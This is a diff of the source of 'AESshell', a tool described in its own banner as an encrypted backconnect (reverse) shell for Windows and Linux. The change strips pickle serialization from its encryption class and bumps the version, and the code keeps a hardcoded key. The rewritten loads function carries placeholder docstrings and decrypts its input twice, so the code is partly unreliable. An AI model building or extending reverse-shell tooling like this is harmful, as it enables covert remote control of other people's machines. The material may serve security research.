@@ -14,7 +14,6 @@ import threading
 import subprocess
 import multiprocessing
 
-import cPickle as pickle
 from Crypto.Cipher import AES
 
 #unix specific
@@ -40,7 +39,6 @@ class Crypticle(object):
 		http://code.activestate.com/recipes/576980/
 	"""
 
-	PICKLE_PAD = "pickle::"
 	AES_BLOCK_SIZE = 16
 	SIG_SIZE = hashlib.sha256().digest_size
 
@@ -85,21 +83,18 @@ class Crypticle(object):
 			data = cypher.decrypt(data)
 			return data[:-ord(data[-1])]
 
-	def dumps(self, obj, pickler=pickle):
-		"""pickle and encrypt a python object"""
-		return self.encrypt(self.PICKLE_PAD + pickler.dumps(obj))
+	def dumps(self, obj):
+		""" argl """
+		return self.encrypt(obj)
 
-	def loads(self, data, pickler=pickle):
-		"""decrypt and unpickle a python object"""
-		data = self.decrypt(data)
+	def loads(self, obj):
+		""" argl """
+		data = self.decrypt(obj)
 		if data == -1:
 			return -1
-		# simple integrity check to verify that we got meaningful data
-		if data.startswith(self.PICKLE_PAD) == -1:
-			print "unexpected header"
-			return -1
-		return pickler.loads(data[len(self.PICKLE_PAD):])
-	
+
+		return self.decrypt(obj)
+
 class winShell(object):
 
 	def __init__ (self): 
@@ -384,7 +379,7 @@ def run(rip,rport,key):
 	print "[*] Finished"
 
 def main():
-	version = '0.7'
+	version = '0.7.2'
 	key = "F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4="
 
 	parser_description = "AESshell v%s - backconnect shell for windows and linux\n\t\tusing AES CBC Mode and HMAC-SHA256\n\t\tspring 2015 by Marco Lux <ping@curesec.com>" % version
